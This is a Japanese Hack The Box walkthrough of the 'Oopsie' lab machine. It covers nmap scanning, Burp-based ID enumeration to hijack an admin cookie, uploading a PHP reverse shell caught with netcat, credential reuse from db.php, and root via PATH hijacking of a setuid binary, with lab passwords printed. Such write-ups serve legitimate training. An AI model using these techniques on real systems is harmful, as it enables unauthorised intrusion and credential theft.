### 0. はじめに
Hack the box のウォークスルー（CTFでいうWrite Up）の英語版はたくさん存在するが，
日本語はあまり見かけないため，今回から日本語で記載．

### 1. ポートスキャン
TCPのポートでサービスが何を動いているかをnmapによって調査．
（nmapは速度は遅いが，--scriptオプションがかなり優秀）
```
$ sudo nmap -A 10.10.10.28
```
オプションは適時変更する．
今回は，22番（SSH）と80番（HTTP）が動いていることが分かる．
SSHはマシン管理者の整備用であると思われるため，
80番を中心に見ていく．

### 2. Webアプリケーションへの攻撃
ブラウザでhttp://10.10.10.28/ にアクセスするが，あまり情報が得られず．
そこでプロキシツールにより通信を見るために，Burp Suiteを使用する．
（この工程はブラウザの開発オプションで代用可能）
Burp Suiteの設定はFoxy Proxyを利用すると簡単に設定，変更ができる．
詳しくは以下を参照してほしい\[[1](https://ztetez.hatenablog.com/entry/2019/04/06/165943 "1")\]．
Burp SuiteのTarget->Site mapからcdn-cgi/login/というディレクトリがあることが分かる．

Webブラウザで，http://10.10.10.28/cdn-cgi/login にアクセスする．
ログインフォームに，前回のマシンであるArchetypeで入手したパスワードを入力する．
```
Username : administrator
Password : MEGACORP_4dm1n!!
```
ログイン後，Uploadsページはsuper adminユーザが必要であるとわかる．
また，Burpでプロキシをかませた後，アップロードページを見ると，以下のメソッドが送信されていることが分かる．
```
GET /cdn-cgi/login/admin.php?content=accounts&id=1
```
このことから，id=の後の数字を変えることで，ログインしているユーザを変えることができることに気づく．
そこで，Burpで自動にそれらをしてくれるIntruderにこの通信内容を投げる(Proxy->HTTP history から該当の通信を右クリック->IntruderまたはCtrl-I)．
また，下準備にターミナルで以下を入力し，出力をコピーしておく(forループで1~100までの数字を出力するだけ)．

```
for x in $(seq 1 100);do echo $x;
```
Intruder->Payload Options\[Simple list\]の欄に張り付け，Optionタブから，Redirections->Follow redirectionsをAlwaysにし，Process cookies in redirectionsにチェックを入れる．
（※Follow redirectionsは、リダイレクトする際にクリックが必要なWeb UIがあったときに自動的に遷移させる，Process cookies in redirectionsはリダイレクト先にもcookieを転送する設定\[[2](https://portswigger.net/burp/documentation/desktop/tools/repeater/options "2")）\]
attackをクリックし，攻撃を実行すると以下の図のようになる．

![IDの変更](./pictures/Oopsie/p1.png "Burp1")

実行をLengthでソートし，文字列の長さが通常とは異なるリクエストを中心に確認をしていく．
Payloadが30であるリクエストを確認するとsuper adminであることがわかり，そのcookieは86576であることがわかる．
このcookieを用いてsuper admin権限でuploadサイトに遷移する．
まず，Procy->HTTP historyからuploadサイトへのログを右クリック->RepeaterまたはCtrl-Rでリピータに渡す．
リピータでcookieのuserを86576に変更をしてsendをクリックしてリクエストを飛ばす．

![IDの変更](./pictures/Oopsie/p2.png "Burp2")

ステータスが200のコードが返ってきたので，成功である．
レスポンスを右クリックをし，show response in browserをクリックする．

Kaliにデフォルトで格納されているphp reverse shellをコピーし，test.phpとして保存する．

```
# cp /usr/share/webshells/php/php-reverse-shell.php ./test.php
```

このphpファイルは，実行すれば攻撃対象のマシンからセッションの接続の要求をしてくれるリバースシェルの役割がある．
test.phpの中身のipアドレスを自身のアドレス($ hostname -I コマンドの10.0.X.Xで始まるアドレス)とポート番号（ここでは1234）に変更する．
編集後のphpファイルを先ほどのアップロードページに送信する．
この時，プロキシはインターセプト（Proxy->Intercept->Intercept On）にする．
そして以下のように先ほどのcookieに変更してSendを送信する．

![IDの変更](./pictures/Oopsie/p3.png "Burp3")

以下の図のようにリクエストが200になって返ってくればアップロードは成功と思われる．

![IDの変更](./pictures/Oopsie/p4.png "Burp4")

### 3. セッションの確立
次にアップロードされたファイルがどこにあるかを探す必要がある．
gobusterにより，サイトに隠れたディレクトリがないかを調べる．

```
$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.28/
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.28/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/07/20 11:25:29 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 276]
/.hta                 (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/css                  (Status: 301) [Size: 308] [--> http://10.10.10.28/css/]
/fonts                (Status: 301) [Size: 310] [--> http://10.10.10.28/fonts/]
/images               (Status: 301) [Size: 311] [--> http://10.10.10.28/images/]
/index.php            (Status: 200) [Size: 10932]                               
/js                   (Status: 301) [Size: 307] [--> http://10.10.10.28/js/]    
/server-status        (Status: 403) [Size: 276]                                 
/themes               (Status: 301) [Size: 311] [--> http://10.10.10.28/themes/]
/uploads              (Status: 301) [Size: 312] [--> http://10.10.10.28/uploads/]
                                                                                 
===============================================================
2021/07/20 11:26:48 Finished
===============================================================
```

uploadというフォルダが確認でき，先ほどアップロードしたファイルが存在すると予測される．
そこでnetcat（nc）コマンドでリッスンをして置き，phpファイルを実行してセッションを確立する．
別の端末でncコマンドを実行する．
ncコマンドは先ほどのphpファイルに指定したポート番号と同じにする．

```
┌──(kali㉿kali)-[~/Documents/htb/starting_point]
└─$ nc -lnvp 1234                                     
listening on [any] 1234 ...
connect to [10.10.14.176] from (UNKNOWN) [10.10.10.28] 51140
Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 09:04:10 up  3:03,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
```

実行はcurlコマンドでphpファイルにアクセスしてあげることにより，することができる．

```
$ curl http://10.10.10.28/uploads/test.php
```

セッションを確立後，ユーザのホームディレクトリを見るとflagの取得ができる（ncコマンドを立ち上げたターミナルがいじれるようになる）．

### 4. 権限昇格
権限昇格につながるようなファイルを探す．

```
$ ls /var/www/html/cdn-cgi/login
admin.php
db.php
index.php
script.js

$ cat /var/www/html/cdn-cgi/login/db.php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```

mysqlのアカウントであるが，パスワードの使いまわしなどがあり得るため，
robertユーザにスイッチできるかを試す．
mysqli_connectは現在非推奨の関数らしい．

```
$ su robert
su: must be run from a terminal
```

しかし初期の設定ではエラーが発生する．
そこでシェルをパワーアップさせる．
/dev/nullはエラーメッセージを見たくないときに使う．

```
$ SHELL=/bin/bash script -q /dev/null
www-data@oopsie:/$ su robert
su robert
Password: M3g4C0rpUs3r!
```

または以下のコマンドでもOK．

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

idコマンドでグループを確認する．
そこで属していたbugtrackerの調査する．
2> /dev/nullはエラーメッセージの出力を(2>)を存在しない場所(/dev/null)にすることで表示させないようにする．
これはfindコマンドをルートディレクトリに対して行うと，権限のエラーなどが多く出てきてしまい煩わしいためである．

```
robert@oopsie:/$ id
id
uid=0(root) gid=1000(robert) groups=1000(robert),1001(bugtracker)

robert@oopsie:/$ find / -type f -group bugtracker 2> /dev/null
find / -type f -group bugtracker 2> /dev/null
/usr/bin/bugtracker

robert@oopsie:/$ ls -l /usr/bin/bugtracker
ls -l /usr/bin/bugtracker
-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
```

ls -l の結果により，bugtrackerはユーザ権限での実行でもroot権限の動作を引用できるためこれを利用する．

```
robert@oopsie:/$ /usr/bin/bugtracker
/usr/bin/bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 000
000
---------------

cat: /root/reports/000: No such file or directory
```

これによりcatコマンドを相対パスで途中で読んでいることがわかるため，パスをいじって参照するcatコマンドを変えればよい．
以下の通り．

```
robert@oopsie:/$ cd /tmp
cd /tmp
robert@oopsie:/tmp$ echo '/bin/sh' > cat
robert@oopsie:/tmp$ chmod +x cat
robert@oopsie:/$ export PATH=/tmp:$PATH
export PATH=/tmp:$PATH
robert@oopsie:/tmp$ /usr/bin/bugtracker
/usr/bin/bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 1
1
---------------


# cd /root
lcd /root
# ls
ls
reports  root.txt  root.txt~
# cat root.txt
cat root.txt
# more root.txt
more root.txt
af13..................
```

以下のファイルは次回以降に使うらしい．
configディレクトリの中身はチェックするといいらしい．

```
# ls -la
ls -la
total 52
drwx------  8 root root   4096 Aug 31 07:09 .
drwxr-xr-x 24 root root   4096 Jan 27  2020 ..
lrwxrwxrwx  1 root root      9 Jan 25  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root   3106 Apr  9  2018 .bashrc
drwx------  2 root root   4096 Jan 24  2020 .cache
drwxr-xr-x  3 root root   4096 Jan 25  2020 .config
drwx------  3 root root   4096 Jan 24  2020 .gnupg
drwxr-xr-x  3 root root   4096 Jan 23  2020 .local
-rw-r--r--  1 root root    148 Aug 17  2015 .profile
drwxr-xr-x  2 root root   4096 Aug 31 07:21 reports
-rw-r--r--  1 root root     33 Feb 25  2020 root.txt
-rw-r--r--  1 root robert   33 Aug 31 07:09 root.txt~
drwx------  2 root root   4096 Jan 23  2020 .ssh
-rw-------  1 root root   1325 Mar 20  2020 .viminfo
# cd .config
cd .config
# ls
ls
filezilla
# more filezilla
more filezilla

*** filezilla: directory ***

# less filezilla
less filezilla
WARNING: terminal is not fully functional
filezilla is a directory
# ls filezilla
ls filezilla
filezilla.xml
# cd filezilla
cd filezilla
# more filezilla.xml 
more filezilla.xml
<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
<FileZilla3>
    <RecentServers>
        <Server>
            <Host>10.10.10.46</Host>
            <Port>21</Port>
            <Protocol>0</Protocol>
            <Type>0</Type>
            <User>ftpuser</User>
            <Pass>mc@F1l3ZilL4</Pass>
            <Logontype>1</Logontype>
            <TimezoneOffset>0</TimezoneOffset>
            <PasvMode>MODE_DEFAULT</PasvMode>
            <MaximumMultipleConnections>0</MaximumMultipleConnections>
            <EncodingType>Auto</EncodingType>
            <BypassProxy>0</BypassProxy>
        </Server>
    </RecentServers>
</FileZilla3>
# 
                            
```
